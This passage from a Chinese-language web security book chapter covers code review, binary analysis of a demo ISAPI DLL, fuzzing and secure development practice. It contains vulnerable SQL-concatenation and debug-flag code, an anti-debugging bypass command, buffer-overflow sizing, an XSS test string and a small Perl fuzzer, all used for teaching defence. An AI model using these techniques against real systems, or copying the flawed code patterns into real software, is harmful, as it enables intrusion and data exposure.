ASP.NET 的应用程序服务器提供了经过严格审查的会话管理功能，比如 Web.xml 和 Web.config 中的配置选项，它使会话在一定时间未响应后过期。很多平台也提供更高级的授权流程，比如微软的授权管理器（Authorization Manager, AzMan）或者 ASP.NET IsInRole，提供了基于角色的访问控制（role-based access control, RBAC）。在非 Microsoft 平台上，Jakarta Struts 提供了基于配置的 RBAC。

糟糕的会话管理会在数据层给应用程序带来更严重的影响。继续我们先前的例子，让我们假设来自 Cookie 的 userid 传给 SQL 语句执行一个查询，然后返回与 userid 相关的数据。这样组织起来的代码如下所示：

String userId = (String)cookieProps.get("userid");
sqlBalance = select a.acct_id, balance from acct_history a, users b + "where a.user_id = b.user_id and a.user_id = " + userId + " group by a.acct_id";

这是相当典型的 SQL 语句串联：胡乱地把用户的输入汇集到一起，然后根据输入执行查询。你应该仔细检查类似这样连接的 SQL 逻辑。

显然，我们先前提出的使用存储过程和参数化查询，而不是使用原始 SQL 串连进行查询的建议，在这里是非常适宜的。但是，我们还是希望强调该例对授权的寓意：它再一次说明如果使用原始 SQL 串联进行查询，客户端只需简单地篡改 userid，就可以访问敏感信息，在这个例子中是 sqlBalance。为了避免这些授权问题，会话 ID 管理应该由现成应用程序服务器进行，或者通过数据库层在内存中创建的临时表来实现。后者对大型应用程序不能够很好地扩展，因此前者是主流趋势。

访问控制也可以使用各种框架，诸如 Java 认证和授权服务（Java Authentication and Authorization Service，JASS）以及 ASP.NET 来实现（参见“参考和进一步阅读”）。

在代码中调试错误 Web 应用程序的最古老 的代码级别的安全漏洞之一，是在产品发布中留下了“调试”功能。

常见的一个例子是提供调试参数来查看关于应用程序的额外信息。这些参数常常在查询字符串中或作为 Cookie 的一部分发送。

if("true".equalsIgnoreCase(request.getParameter("debug"))<%=sql%>

如果 debug 参数被设置为 true，整个 SQL 语句会显示在客户端。该问题另一个类似的例子是 isAdmin 参数。该值设置为 “true” 会获得与管理员相同的对应用程序的访问权限，这有效地实现了一个垂直权限提升攻击（参见第 5 章）。

显然，debug/admin 模式开关应该从不在一个产品环境中实现。

#### 12.2.2 自动源代码评审

自动代码分析比手动分析高效得多，但是现在的工具还远远不够全面，也不像人工评审那样准确。但不管怎么样，还是有一些可用的不错的工具，而且，在产品发布前识别出的每一个简单的输入验证问题，与最后发布后被外界所发现相比，都更有价值。表 12-1 列出了一些可以改进代码安全的工具。就像你会注意到的那样，几乎所有的工具都是针对 C 和 C++语言的，这对一般使用 Web 中心开发平台诸如 ASP.NET、Java 和 PHP 的 Web 开发者没有多大的帮助。

警告 这些工具不能看做是正式的代码评审和安全编程措施的替代品。这些工具也有很高的误警率，需要大量的调校才能产生有用的结果。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>名称</td><td style='text-align: center; word-wrap: break-word;'>语言</td><td style='text-align: center; word-wrap: break-word;'>链接</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>/GS 标志</td><td style='text-align: center; word-wrap: break-word;'>C/C++</td><td style='text-align: center; word-wrap: break-word;'>http://msdn.microsoft.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Inspector（以前的 Bugscan）</td><td style='text-align: center; word-wrap: break-word;'>C/C++ 二进制</td><td style='text-align: center; word-wrap: break-word;'>library/en-us/vccore/html/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>CodeAssure</td><td style='text-align: center; word-wrap: break-word;'>C/C++ Java</td><td style='text-align: center; word-wrap: break-word;'>vclrfGSBufferSecurity.asp</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DevInspect</td><td style='text-align: center; word-wrap: break-word;'>ASP.NET (Visual Basic and C#)</td><td style='text-align: center; word-wrap: break-word;'>http://www.securesw.com/products/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Flawfinder</td><td style='text-align: center; word-wrap: break-word;'>C/C++</td><td style='text-align: center; word-wrap: break-word;'>http://www.dwheeler.com/flawfinder/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RATS</td><td style='text-align: center; word-wrap: break-word;'>C/C++ Python Perl PHP</td><td style='text-align: center; word-wrap: break-word;'>http://www.securesw.com/resources/tools.html</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SPLINT</td><td style='text-align: center; word-wrap: break-word;'>C</td><td style='text-align: center; word-wrap: break-word;'>http://lclint.cs.virginia.edu/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>FXCop</td><td style='text-align: center; word-wrap: break-word;'>.NET</td><td style='text-align: center; word-wrap: break-word;'>http://www.gotdotnet.com/team/fxcop/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ITS4</td><td style='text-align: center; word-wrap: break-word;'>C/C++</td><td style='text-align: center; word-wrap: break-word;'>http://www.cigital.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PREfast</td><td style='text-align: center; word-wrap: break-word;'>C/C++</td><td style='text-align: center; word-wrap: break-word;'>在 Microsoft Visual Studio 2005 中可用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Prexis</td><td style='text-align: center; word-wrap: break-word;'>C/C++, Java</td><td style='text-align: center; word-wrap: break-word;'>http://www.ouncelabs.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Fortify 源代码分析套件</td><td style='text-align: center; word-wrap: break-word;'>ASP.NET, C, C++, C#, Java, JSP, PL/SQL, T-SQL, VB.NET, XML</td><td style='text-align: center; word-wrap: break-word;'>http://www.fortifysoftware.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Coverity</td><td style='text-align: center; word-wrap: break-word;'>C/C++</td><td style='text-align: center; word-wrap: break-word;'>http://www.coverity.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>DevPartner</td><td style='text-align: center; word-wrap: break-word;'>C#, VB.NET</td><td style='text-align: center; word-wrap: break-word;'>http://www.compuware.com/</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>SecurityChecker</td><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

#### 12.2.3 二进制分析

二进制分析是在机器码级别，特别是在不能访问源代码的时候分析二进制的艺术（更多的背景知识，请参见本章末尾的“参考和进一步阅读”）。历史上，二进制分析是公司对竞争对手的产品所进行的活动，以了解对方程序的设计思路或内部工作原理。最近，二进制分析开始变成安全评估产业中的支柱，因为它能够很快地探测出病毒、蠕虫和其他恶意软件的功能。本节将描述二进制分析在 Web 应用程序充分认知安全评审中的角色，然后演示二进制分析的基本方法：对一个简单的 Web 应用二进制文件进行二进制分析。

警告 对软件进行二进制分析可能会违反终端用户许可协议（end-user license agreement, EULA），在一些情况下，对代码进行逆向工程可能会导致刑事处罚。

##### 在充分认知评审中二进制分析的职责

在我们演示基本的二进制分析技术前，先搞清楚它在 Web 应用安全充分认知评估中的职责是非常重要的。

要解决的一个主要问题是“假设我已经得到源代码，为什么还要花费精力分析二进制文件呢？”许多安全研究人员已经发现二进制分析是源代码审查的重要补充。这主要是由于二进制分析是在纯粹的配置环境中检查应用程序，因为代码在真实的环境下执行时，会暴露出孤立查看源代码时不会出现的许多其他的问题。这些问题包括编译器对代码的修改，运行环境对代码交互和变量的引入，或者只会在执行过程中出现的竞争条件。

最重要的是，二进制分析可以识别由第三方库引入的漏洞——即使使用这些库的用户没有源代码。另外，在我们的咨询工作中，我们已经发现在开发新软件时，使用了很多额外的代码。在很多情况下，对这些组件的源代码是无法获得的。因此，即使你是内部安全审计团队的一个成员，为内部 Web 应用访问了所有的源代码，也不能假设你的软件是绝对安全的，因此，二进制分析是审计者工具箱的重要组成部分。

最后，留意 Web 应用中编译后的代码的重要性也是很重要的。就像我们在第 1 章提到的那样，Web 由静态文档服务技术发展而来，不断演变成为一种复杂的机制，以提供动态的、可扩展的、高性能的功能。微软的服务器应用程序编程接口（Internet Server Application Program Interface，ISAPI）和 Apache 的可加载模块是这种演变的最新例子。它们提供了与 Web 服务器有计划的集成，特别提供了比公共网关接口（Common Gateway Interface，CGI）程序更快的应用性能。现在在高性能 Web 应用中，使用 ISAP 和 Apache 可加载模块成为了常见的方法，因此，我们在下一节将使用 ISAPI 来说明在一个真实 Web 应用上的二进制分析。

##### 二进制分析的一个例子

在后面的小结中（和本章的其他地方），我们把创建的 ISAPI 例子叫做 “secret.dll”。该 ISAPI 的主要功能是接受来自用户的一个字符串，并基于用户输入的值，显示 “成功” 或 “不成功” 的页面。通过在 IIS 服务器上配置的典型 Web 接口来使用 secret.dll，这样它可以通过 HTTP 被访问到，如图 12-5 所示。如果提供的秘密字符串正确，就会显示 “成功” 页面，否则会显示 “不成功” 页面。一个静态的秘密保存在 ISAPI DLL 中，这样它可以与用户提供的输入进行比较。本节的目的是演示在 Windows 平台上，如何通过二进制分析获得这个秘密。我们假设在后面的讨论中，在 Windows IIS 机器上已正确地安装并运行了 secret.dll，并且我们有能力调试此系统。

 </div>

##### 调试入门

在二进制分析中的第一步，是把二进制文件加载到你偏爱的调试器中。在这个例子中，我们将使用 Ollydbg，一个由 Oleh Yuschuk 编写的免费的 Win32 调试器。这是写这本书的时候可以直接获得的免费调试器之一。IDA Pro 是另一个流行的调试工具，是 DataRescue SA 出品的商业软件。

图 12-6 显示了 Ollydbg 的主界面，包括 CPU 窗口，在此窗口将进行大多数调试工作。CPU 窗口包含 5 个面板：反汇编、信息、寄存器、转储和堆栈。反汇编面板显示了被调试程序的代码，信息面板对反汇编面板中所选择的第一条命令的参数解码，寄存器面板为当前选择的线程显示 CPU 寄存器的内容，转储面板显示内存中的内容，堆栈面板显示当前线程的堆栈。

 </div>

可以直接在 Ollydbg 中打开要调试的程序（菜单“文件”|“打开”），或者把 Ollydbg 附加到运行的应用程序进程（“文件”|“附加”|<进程Exe名>|“附加”）。在一个运行的应用程序处理输入时对其进行调试，是对它的功能逆向工程的最好方法，因此这也是我们对 secret.dll 所使用的方法。因为 secret.dll.是一个 ISAPI，所以它运行在 IIS Web 服务器进程中。因此，我们将使用 Ollydbg 附加至主 IIS 进程（inetinfo）（“文件”|“附加”|<inetinfo.exe>|“附加”）。

一旦附加，我们很快就会发现 secret.dll 包含了一个叫做 IsDebuggerPresent 的函数，当我

们企图单步调试它的时候，它就会终止执行。这是一种用来阻止调试的常用技术，不过也很容易被绕过。最简单的方法是，加载 Ollydbg 的命令行插件（ALT+F1），输入如下的命令：

set byte ptr ds: [fs: [30]+2] = 0

该命令设置 IsDebuggerPresent API 总是返回 “false”，有效地掩饰了调试器的存在。

另外，我们也可以在 IsDebuggerPresent 函数中设置一个断点，然后手动地将它的值改为 0。这要花更多的精力，但我们将在这里详细描述它，因为这个过程包含了一些基本的调试技术。我们首先重新加载 secret.dll（使用 Ollydbg 的 CTRL+F2 快捷键），然后一旦调试器暂停了，就加载命令行插件（ALT-F1），在 IsDebuggerPresent 函数调用时，设置一个断点（输入 bp IsDebuggerPresent），如图 12-7 所示。

 </div>

提示 插件应该作为工具栏的一部分出现，如果没有出现，那么需要设置插件路径。要设置插件路径，请浏览“选项”|“插件路径”，然后更新插件的位置（一般是Ollydbg的主目录）。

我们继续加载 DLL（SHIFT+F9）直到到达位于 IsDebuggerPresent 的断点（参见图 12-8 中的 “Note 1”）。然后我们执行接下来的两条指令（SHIFT+F7），并在图 12-8 中的 Note 2 指明的函数位置停止。在反汇编面板中右击，选择 “转储” | “内存地址”，IsDebuggerPresent 函数的位置和值就在 Dump 面板中显示出来。位置是 7FFDA002，内容是

01 00 FF FF FF FF 00 00 40 00 A0 1E 19 00

 </div>

右击该字符串中的第一个值（01），选择“二进制\用-00 填充”将更新函数的结果为00，如图 12-8 中 Note3 所示。

我们现在主动地改变了 IsDebuggerPresent API 的返回值，使它总是为 0。因此，该 DLL 现在可以被加载了，不会因为 Ollydbg 的存在而被终止。

二进制分析技术 现在，我们可以开始讲述二进制分析的具体细节了。我们将介绍的主要技术包括：

- 枚举函数 我们将查看常见的和安全问题相关的函数，比如字符串处理 API，strcpy 和 strcat。

- 识别 ASCII 字符串 这可能发现隐藏的秘密字符串，或者可能指出常见的流程（通过映射二进制的功能，可以有助于我们进一步的分析）。

- 单步跟踪关键功能 一旦我们得到了函数和字符串的基本列表，就可以单步跟踪二进制程序的执行，在感兴趣的流程上设置断点等。这种方法最终会揭露所有重大的安全漏洞。

首先，我们将枚举 secret.dll 使用的所有函数。回到 Ollydbg 中，从已加载的可执行模块列表中右击 Secret.dll 选项（“查看”|“可执行模块”），选择“查看名字”，将会显示 secret.dll 中使用的函数列表。它们包含导入和导出函数两个调用列表。一些函数可能会引起你的注意，包括 strcpy 和 strcat（因为使用这些古老的函数操作字符串，常常会受到缓冲区溢出的攻击），以及 memcpy（会导致类似的问题）。类似这样的有问题的 C/C++函数，如今已经有了详细的说明，在 Internet 上简单地搜索“不安全的 C/C++函数”（insecure C/C++ functions），就会找到一些很好的参考资料。

提示 函数调用也可以使用命令行工具 dumpbin.exe 转储出来，dumpbin.exe 由 Visual C++ 提供（使用方法 dumpbin /EXPORTS secret.dll）。

通过右击 secret.dll 加载的反编译面板，选择菜单 “搜索” | “所有参考文本字符串”，我们能识别出 secret.dll 内部的 ASCII 字符串。

提示 也可以使用 "strings" 程序来提取 secret.dll 里的 ASCII 字符串。

最后，通过更深入地探查一些感兴趣的函数，我们将分析 secret.dll 的关键功能。首先，右击 MSVCR71.strcpy 选择参考应用，会弹出一个引用（reference）列表的新面板，在引用上设置断点（Ollydbg 的 F2 快捷键可以随手设置断点）。我们对 MSVCR71.strcat 和 MSVCR71.memcpy 重复这个工作。

我们也在 ASCII 字符串上设置断点，通过在反编译窗口中右击，选择菜单 “搜索” “所有参考文本字符串”。我们立即就在输出中发现了一些有趣的文字：“你没有输入合法的值，你尝试的值是”。这可能是返回给输入的非法字符串的错误消息，同时隐蔽地指出了一条通向输入和秘密字符串函数比较位置的路径。

提示 在一些应用程序中，开发者将错误消息改为存在一个字符数组中以避免此类攻击，因此要在这些程序中找到这样的字符串有点困难。

现在，给 secret.dll 提供一些输入，看看会给我们显示什么。我们浏览如图 12-5 所示的 Web 页面，输入任意的字符串 “AAAAAAAA”。Ollydbg 暂停在 “秘密测试失败” 的错误消息上。在反编译窗口中右击，选择 “分析” | “分析代码”。在分析结束后，检查断点上

方几行的代码，我们发现另一个 ASCII 字符串 “SecurityCompass”。我们发现的内容显示在图 12-9 中。

 </div>

进一步检查代码，我们发现程序在将字符串“SecurityCompass”和Arg2作比较。赋给Arg2的值是通过Web传递的，并使用EDX寄存器压入到堆栈中（内存的位置为1000117D）。一旦两个值都被加载到堆栈后，就在函数调用中比较这两个值（在内存10001183位置，调用了secret.10001280），把结果放在EAX寄存器中。EAX寄存器会被设成1或0。如果设为0（TEST EAX,EAX），那么就跳到“失败消息”，否则，就跳到“成功消息”。因此，如果在Web界面中提供字符串“SecurityCompass”，将会显示一个“成功消息”，否则将会显示一个“识别消息”。我们已经发现了能使Web应用程序“芝麻开门”的东西了。

但等一下——还有一些东西！继续执行接下来的几行指令（使用 Ollydbg SHIFT+F9 快捷键），程序会暂停在“strcat”断点上。我们添加额外的断点到 strcat 的参数：“src”和“dst”上。然后我们回去再次给应用程序提供一些任意的输入，观察调试器中的执行情况。应用程序现在应该停在“src”上，它包含了来自界面的字符串“SecurityCompass”，“dst”应该包含字符串“Successful Message”。因此，strcat 被用来生成返回给客户端显示的最终字符串。

就像我们前面提到的那样，`strcat` 是一个 C/C++ 字符串操作函数，带有众所周知的安全

问题。举个例子，strcat 没有带任何最大长度限制值（不如 strncat 安全）。因此，一个足够长的字符串传递给 ISAPI 时，可能会使 ISAPI 产生不恰当的行为。为了确定字符串长度达到多少时会给 ISAPI 带来问题，检查 strcat 函数周围的代码，找到分配给目标字符串的最大长度，如图 12-10 所示。

 </div>

将目标地址加载到堆栈所用的指令是 LEA ECX,DWORD PTR SS:[EBP-98]。因此，可以存储的最长值是 98 字节（十六进制），即十进制的 152 字节（程序中声明的是 140 字节，剩下的字节用做对齐）。提供超过 152 个字符的输入，可能会导致 secret.dll 中的缓冲区溢出。152 字节也包含了返回给客户端的整个页面（104 字节）。因此，发送一个大约 152 字节长的字符串，会导致程序崩溃。

注意 如果 C++ 错误处理编译器选项被禁用，那么会得到更详细的错误信息。

在这里想起了另一个简单的攻击——跨站脚本，因为 secret.dll 没有执行任何的输入过滤。我们可以通过发送如下的输入给 Web 输入界面，简单地测试这个漏洞。

<script>alert('ISAPI XSS')</script>

总之，执行二进制分析不仅仅有助于发现秘密，也有助于发现应用程序中的缺陷！

### 12.3 应用程序代码的安全测试

如果代码评审可以有效地捕获所有的安全缺陷，岂不是很好吗？遗憾的是，由于各种原因，事实并非如此。最主要的原因是没有哪个的安全评估机制是完美的。因此，无论对应用程序执行什么级别的代码评审，在真实环境中严格的测试代码安全总是会暴露更多的缺陷，而且其中的一些是非常严重的缺陷。这一节将详细描述 Web 应用安全测试的一些关键方面，包括：

○ 模糊测试

☐ 测试工具、程序和用具

##### ☐ 渗透测试

#### 12.3.1 模糊测试

模糊测试是指发送任意的和恶意构造的数据到应用程序，企图造成程序行为异常，以此来识别潜在的安全漏洞。市面上有很多关于模糊测试的文章和书，因此我们在这里不进行冗长地讨论，但是我们将简要地讨论下现成的模糊测试工具以及自己编写的模糊测试器。关于模糊测试的更多信息，请参见本章末尾的“参考和进一步阅读”。

当然，模糊测试也是在黑盒测试过程（参见第6章）中执行的。在本节中，我们将专注在白盒情况下使用模糊测试，即，用调试器挂钩目标程序来测试，这样可以很容易地识别和分析程序中的错误。

##### 现成的模糊测试器

有很多现成的模糊测试器。比较好的一个是 Spike，它主要针对 C 和 C++应用程序。Spike Web Proxy 对 Web 应用程序采取同样的模糊测试方法。Spike 用 Python 编写，执行输入验证和认证攻击，包括 SQL 注入，表单输入字段溢出和跨站脚本。

Spike Web Proxy 通过运行一个批处理文件（runme.bat）来启动，然后配置浏览器使用本地 Spike 代理服务器（在端口 8080 的 localhost）。然后，简单地连接到目标 Web 应用程序，Spike 代理接管链接，并在 http://spike 创建一个测试控制台。该控制台列出了针对应用程序可能的攻击技术，包括“调查目录”、“参数扫描”、“目录扫描”、“溢出”和“XML 漏洞测试”。挨个选择链接来执行这些针对应用程序的攻击。Spike 会在浏览器下面的框架中显示扫描的结果。

Spike Web Proxy 也可以用来发现 secret.dll ISAPI 中的漏洞，secret.dll 是我们先前创建来用做二进制分析的文件。就像我们在那一节中看到的那样，有一些 “诱饵” 非常管用，可以 “捕捉” 调试中的应用程序，暴露运行中代码的关键方面。模糊测试工具就是很好的 “诱饵器”。

举个例子，为了发现 secret.dll ISAPI 中的漏洞，加载 Ollydbg，然后像前面一样把它附加到 Web 服务器进程。启用 Spike Proxy 并浏览应用程序，然后浏览本地 Spike 接口（http://spike）。选择“溢出”来执行一个针对 ISAPI 的缓冲区溢出攻击。

就像在 “二进制分析” 一节中使用 Ollydbg 所看到的一样，来自 URL 的字符串被加载到 EDI。字符串被写入到堆栈，如堆栈面板中显示的一样。超长的字符串使 ISAPI 崩溃了。访问异常就表明 ISAPI 已经崩溃。EAX 和 ECX 寄存器已经被覆盖成 41414141（十六进制表示是 AAAA），如图 12-11 所示。

 </div>

#### 构建你自己的模糊测试器

可以使用任何脚本语言来构建你自己的模糊测试器。像 curl 和 netcat 这样的程序也可以封装在脚本中，从而简化创建基本 HTTP 请求-响应功能所需要的精力。当然，为了获得更快的性能，最好是使用 C/C++ 编写模糊测试器。

下面是一个 Perl 例子代码，创建了一个 POST 请求给我们的 secret.dll ISAPI Web 应用程序例子。注意，我们创建了一个循环流程，迭代几个包含有随机数目 A 的请求。

#!/usr/local/bin/perl -w
use HTTP::Request::Common qw(POST GET);
use LWP::UserAgent;
$ua = LWP::UserAgent->new();
$url = "http://127.0.0.1/_vti_script/secret.dll";
//循环
for ($i=0; $i <= 10; $i++)
380

{
    //产生随机数目个A
    $req = $ua->post( $url, [MfcISAPICommand => SecretProc, Secret => 'A'x int(rand(50))]);
    my $content = $req->content;
    print $content;
    print "\n\n";
}

该脚本是一个非常简单的模糊测试器。

#### 12.3.2 测试工具、程序和用具

还有很多其他的工具可以用来做一般的 Web 应用程序测试，但是在写这本书的时候，市场上刚刚开始兴起了关注 Web 应用安全的质量保证（quality assurance，QA）测试工具。Mercury Interactive 提供了一些更流行的通用 Web 应用测试工具，这些工具包含了一些安全策略功能。SPIDynamics 的 QAInspect 是少数专门关注 Web 应用安全的工具之一。

我们发现很多开发公司都喜欢使用低成本（或免费）的 HTTP 分析软件，来修补他们自己的测试工具包。关于可用来创建测试用具的 HTTP 分析软件，请参见第 1 章。

##### 渗透测试

渗透测试（Penetration testing，pen-testing）常被描述为“由熟练攻击者执行的演习”。也曾有其他的术语被用来描述同样的概念：老虎团队测试（tiger team testing），道德黑客行为（ethical hacking）等等。在定义中的“熟练”一词是非常关键的：我们经常发现，渗透测试结果的质量与执行测试的个人技巧直接相关。

我们认为，渗透测试应该结合到每个软件产品的正常开发流程中，至少在每个主要的发布版本上。因为 Web 应用程序比传统的软件程序更加动态变化（经常以周为单位收到更新），我们推荐至少一年或半年对 Web 应用程序进行渗透测试检查。

渗透测试需要一类特殊的人，这一类人要热衷于攻克、破坏和/或篡改别人构建的技术。我们合作过的大多数公司中，几乎没有人能在思想上和行动上完全适合这项工作。由于“认识的不一致”，以及市场上拥有良好渗透技术人员的薪水与管理层制订预算时所感到的价值存在差距，长期维持一个内部渗透测试团队具有很大的难度。因此，我们建议严格评估执行渗透测试的内部人员的能力，并且认真考虑寻找能提供这类工作的外部服务商。第三方带来的额外好处是公正，而这一点可以在外部合作或市场活动中提出来作为自己公司的优势。举个例子，给潜在的合作伙伴展示曾进行过正规的第三方渗透测试，会使公司在外部采购的竞争中显得与众不同。

假设由你来选择雇佣第三方渗透测试人员来攻击你们的产品，下面是在追求投资回报最大化时，需要考虑的一些关键问题。

- 进度表 理想情况下，渗透测试应该在 beta 代码可用后进行，而且还应该早一点进行渗透测试，以便于预留一些时间在上市日期前能对产品做重大的修改，来修订渗透团队所发现的严重问题。是的，这就是最好的进度线路。

- 联络 确保经理已经指派一个专门的产品团队人员，在测试中给渗透测试人员提供所需的信息。必须让他们顺畅地沟通，这样才能在你的产品中实现必要的专门技术，从而交付出令人满意的结果。

交付很多时候，渗透测试人员在期限的最后那天递交一个文档报告，然后就再也看不到他们了。这份报告停留在某人的桌子上积满了灰尘，直到几个月后出现在年度审计上，那个时候，报告的很多紧要事务都已经丧失最佳处理时机。我们推荐将渗透测试人员加入到内部的缺陷追踪系统中，随着工作的进展他们直接记录问题给开发团队。

最后，不管你选择的是什么安全测试方法，我们强烈推荐所有的测试都集中在风险建模中高优先级别的风险上。这会保持整体测试效果的一致性和连贯性，并朝着减少严重安全漏洞的方向不断前进。

### 12.4 在 Web 开发流程中的安全

我们已经讨论了充分认知分析中的很多措施，包括：威胁建模、代码评审和安全测试。有远见的公司越来越多地把这些迥然不同的流程加入到程序开发生命周期中，因此它们变成了开发流程本身的一个内在部分。

微软已经普及“安全开发生命周期”（Security Development Lifecycle，SDL）这一术语，来描述他们将安全最佳措施纳入开发流程的思想（关于更多 SDL 信息的链接，请参见“参考和进一步阅读”）。我们建议你阅读微软对 SDL 实现的整个描述。同时，下面是一些我们对咨询工作中看到的 SDL 的重要方面的思考。我们围绕产业格言：“人，流程和技术”（people, process and technology）来陈述我们的想法。

#### 12.4.1 人员

人员是任何半自动化流程（比如 SDL）的基础，因此在你的公司中执行 SDL 流程时，请确保考虑了下面的各点。

##### 使流程成为公司文化

很多安全书籍在开始介绍广泛的主动安全防范措施比如 SDL 之前，一上来就建议“获得高管的认同”（get executive buy-in）。但实际上，获得高管的认同只有在开发者听从的是高管意见的时候才有用，但我们的咨询经验表明并不总是这样的。不管怎样，无论高管多么坚定地支持安全团队，总需要一定程度的“草根的支持”（grass-roots buy-in），否则 SDL 就不会被采用来对应用安全进行重大修改。确保在公司上下都很好地宣传和引导你的 SDL 执行，以保证它受到广泛的支持，并会被认为是提高产品质量的合理而有效的机制（而且这是底线）。使流程成为公司文化的一部分，而不是推行每个人都抵触的流程（想想电影 Office Space 的 TPS 报告），会极大地提高流程的潜能。

##### 在开发团队中任命一位安全联络员

开发团队需要理解这样一个事实，他们最终要为自己产品安全负责，落实责任的最好方法，是把它描述为团队成员工作的一部分。另外，指望企业的中心安全团队能掌握开发团队成员的专门技术（整个发布过程中用到的）是不现实的。特别在大型公司中，有很多重要的、分散的软件开发操作，多个项目为了能够受到关注而竞争，所以拥有一个“本地的代理”是绝对必要的。这也会通过单点联系而建立起一个高效的培训和流程执行渠道。

警告 不要误认为安全联络员为产品的安全负责。这必须是开发团队领导层的责任，该领导至少是公司中对应用程序直接负责的执行官。

教育，教育还是教育 教不严，师之惰。对开发者来说更是如此（在他们排得紧巴巴的上市进度中，甚至拼写“安全”这两个字都挤不出时间）。因此，SDL 的启动必须以培训开始，培训有两个主要的目的：

☐ 学习公司的 SDL 流程。

○ 引入公司特有的通用的安全编程最佳实践。

开发出一个课程，估计参加的人数以及听课者对授课内容的理解情况，并且，仍然由管理层负责管理团队。

#### 12.4.2 流程

为了与 SDL 的概念保持一致，你可能需要考虑把本章的每个大节作为软件开发流程中的里程碑（Milestone）。举个例子，在设计的时候进行威胁建模，完成开发后进行代码评审，从 alpha 和 beta 版本直到最终发布进行安全测试。其他的里程碑，包括开发者培训或者发布前的安全审计/评审，也可以在合适时使用。图 12-12 显示了带有假想的 SDL 里程碑（诸如培训和威胁建模）的软件开发生命周期。

 </div>

#### 12.4.3 技术

当然，技术是任何 SDL 实现的关键因素，让一些单调的工作（比如源代码评审）自动化，可以提高 SDL 流程的效率。SDL 也应该在开发流程中指明一致的技术标准，诸如编译参数（比如，微软的/GS 标志），以及输入验证流程标准。以下是关于这些主题需要重点考虑的几点。

#### 改进的自动化评审和测试技术

因为安全在商业中越来越重要，市场会继续开发出更好的代码安全评审和测试技术。在本章中我们已经看到了一些例子，包括微软的 PREFix 代码自动评估工具和 SPIDynamic 的 QAInspect 测试箱。确保你的 SDL 工具集是最新的，这样你的应用程序面临零日攻击的风险会更少。

#### 托管的执行环境

我们强力推荐把你的 Web 应用程序迁移到托管的开发平台上，比如 Sun 的 Java（http://java.sun.com），或者微软的 .NET 框架（http://www.gotdotnet.com）。使用这些环境进行代码开发可以利用它们强健的内存管理技术，而且代码在一个受保护的沙箱中执行，这

样会极大地减少安全漏洞的可能性。

##### 输入验证库

几乎所有的软件攻击都基于这样一个假设，即输入会以一个预料之外的方式处理。因此，软件安全的圣杯是无懈可击的输入验证。大多数软件开发公司都使用正则表达式机制（一些更好的点子请看 http://www.regexlib.com/）来修补他们自己的输入验证流程。微软公司为它的 IIS Web 服务器软件提供了一个现成的输入验证库 URLScan。Apache 也有一个类似的库，叫做 mod_sec（关于 URLScan 和 mod_sec 的更多信息，请参见附录 C）。如果可能，我们推荐使用这些输入验证库来尽可能多地过滤你的应用程序的输入。

如果你选择实现你自己的输入验证流程，请记住这些输入验证最重要规则：

☐ 把需要用户自行输入数据的项目数限制到最少，特别是表单的输入。

- 设想所有的输入都是恶意的，并在应用程序中自始自终都像对待恶意输入那样对待它们。

☐ 不要——永远不要——机械地信任客户端的输入。

- 为你的应用程序将接受的输入设置一些限制（举个例子，一个邮编代码字段只接受5位数字）

☐ 拒绝不符合这些限制的所有输入。

• 过滤所有余下的输入（举个例子，删除像&‘><这样的会被解释成可执行内容的字符）。

对输出进行编码，这样即使泄漏了一些内容，也不会对用户造成伤害。

提示 更多关于输入验证攻击和对抗措施的信息，请参见第 6 章。

##### 平台的改进

密切关注新技术的发展，比如微软的数据执行保护功能（Data Execution Prevention，DEP）。微软已经实现了DEP，来提供针对破坏内存的攻击（比如缓冲区溢出）的广泛的保护（更多的细节参见 http://support.microsoft.com/kb/875352/）。DEP 有硬件和软件两个部分，当在兼容的硬件上运行时，DEP 自动打开，标记特定内存部分为不可执行，除非那部分内存明确地包含了可执行代码。表面上，这会防范大多数基于栈的缓冲区溢出攻击。除了硬件启用的 DEP，Windows XP SP2 和之后的版本也实现了软件 DEP，软件 DEP 尝试在 Windows 上阻止那些利用异常处理机制的攻击。

Web 应用程序开发者应该了解那些在 64 位平台中的改进，并且尽快开始迁移计划。

### 12.5 小结

本章讲述了 Web 应用安全充分认知分析，即“白盒”分析。我们描述了充分认知分析的关键部分，包括威胁建模、代码评审和安全测试。我们强调了威胁建模的重要性，以及它是如何影响接下来的诸如代码评审和安全测试等安全活动的。最后，我们说明了有远见的公司，如何将充分认知分析结合到一个完整的方法中，以进行 Web 应用程序的安全开发，这也被称为安全开发生命周期（Security Development Lifecycle），或者 SDL。

### 12.6 参考和进一步阅读

参考

链接

通用的参考

《编写安全的代码》第二版（Writing Secure ISBN: 0735617228

Code, 2nd Ed.), 作者: Michael Howard 和

David C. LeBlanc

软件安全的 19 宗罪（“19 Deadly Sins of McGraw-Hill/Osborne Media, ISBN: 0072260858

Software Security”), Mic hael Howard,

David LeBlanc 和 John Viega 著

Perl TAINT

微软的安全开发生命周期（SDL）

Windows 数据保护（包括 DPAPI）

Java 加密扩展（JCE）

Java 认证和授权服务（JAAS）

ASP.NET 授权

http://aspn.activestate.com/ASPN/

CodeDoc/Taint/Taint.html

http://msdn.microsoft.com/security/ sdl

http://msdn.microsoft.com/library/

default.asp?url=/library/en-us/

dnsecure/html/windataprotection-dpapi.asp

http://java.sun.com/j2se/1.4.2/docs/

guide/security/

http://java.sun.com/products/jaas/

http://msdn2.microsoft.com/en-us/

library/wce3kxhd.aspx

